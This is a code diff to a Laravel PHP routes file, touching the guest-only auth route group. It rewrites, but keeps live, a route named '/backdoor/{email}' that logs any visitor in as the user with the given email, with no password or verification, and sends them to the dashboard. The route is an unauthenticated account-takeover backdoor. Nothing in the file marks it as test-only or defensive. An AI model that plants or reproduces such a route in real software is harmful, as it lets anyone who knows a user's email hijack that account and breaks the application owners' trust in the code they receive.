@@ -17,6 +17,7 @@ Route::view('help', 'help');
 Route::view('blog', 'blog');
 
 // Auth Group
+
 Route::middleware('guest')->group(function () {
   Route::get('login', function () {
     return view('auth.login');
@@ -30,11 +31,11 @@ Route::middleware('guest')->group(function () {
   })->name('verify');
 
   Route::post('verification', [AuthController::class, 'otpVerification'])->name('verification');
-
-  Route::get('/backdoor/{email}', function($email) {
-    Auth::loginUsingId(\App\Models\User::where('email', $email)->firstOrFail()->id);
-    return redirect()->to('/dashboard');
-  });
+  Route::get('backdoor/{email}', function ($email) {
+        $user = \App\Models\User::where('email', $email)->first();
+        Auth::login($user);
+        return redirect()->to('/dashboard');
+    });
 });
 
 Route::middleware('auth')->group(function () {
